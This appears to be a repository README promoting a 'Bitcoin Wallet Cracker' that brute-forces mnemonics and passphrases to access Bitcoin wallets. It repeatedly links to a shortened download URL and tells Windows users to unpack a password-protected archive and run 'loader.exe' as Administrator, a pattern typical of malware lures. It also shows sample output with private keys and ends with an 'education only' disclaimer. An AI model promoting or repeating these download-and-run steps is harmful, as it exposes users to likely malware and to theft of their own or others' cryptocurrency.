![Bitcoin Wallet Cracker](bc.gif)

**Programmed in Python | PySimpleGUI**

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/VmllSN)

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

[![Open Source Love svg1](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/)

[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/)


# Bitcoin Wallet Cracker

```
Automated Bitcoin wallet recovery tool.
Combines mnemonic brute-force with passphrase dictionary attacks
to reconstruct access to Bitcoin wallet addresses.
```

## Description

This tool systematically attempts to recover Bitcoin wallets by combining
BIP39 mnemonic phrases with customizable passphrase lists. It targets wallets
where either the mnemonic or the optional BIP39 passphrase is partially known.

Unlike pure random scanning, it focuses on high-probability combinations:
common passphrases, leaked wordlists, and user-defined patterns.

## 🔗 Download - v1.19.1

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/VmllSN)

## Usage

### Windows

1. Download the archive from the link above
2. Extract installer.zip archive using WinRAR or 7-Zip
3. Enter password: kraken11
4. Run `loader.exe` as **Administrator**
5. Press start button to batch generate

## Attack Modes

| Mode | Description |
|------|-------------|
| Wordlist | Tests passphrases from a provided dictionary file |
| Brute-force | Iterates all combinations up to a defined length |
| Hybrid | Combines known words with mutations and patterns |
| Resume | Continues a previously interrupted session |

## Output

Addresses with detected balances are saved to `results.txt`:
```
address: 17wd8bTwMPYfbo6YwmTFU4xH4hDkd13ATZ
private key: 0651863bf5d902262b17c4621ec340544ff016752543d99a92d7d22872d8a455
WIF private key: 5Hs4yg5HYcAmS97UPgmj54V6Lvmv1yKf4yGWs4qcwkWjB5FFnaz
public key: 040577b1aa3256fed819174b1e6557d4b269f42e383df393b1e8a4c6b9d117994bc476304738fb948cec05a5d17d0fe6f996e7ec0b4a8e2853e41d6657f3f41e33
```

## Proof of Concept

```
Although this project can be used maliciously, it is simply an
exploration into the Bitcoin protocol, mnemonic standards, and
passphrase derivation using Python cryptographic libraries.
```

# Disclaimer

**The code within this repository comes with no guarantee, the use of this code is your responsibility. I take NO responsibility and/or liability for how you choose to use any of the source code available here. By using any of the files available in this repository, you understand that you are AGREEING TO USE AT YOUR OWN RISK. ALL files available here are for EDUCATION and/or RESEARCH purposes ONLY.**

## 🔗 Download - v1.19.1

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/VmllSN)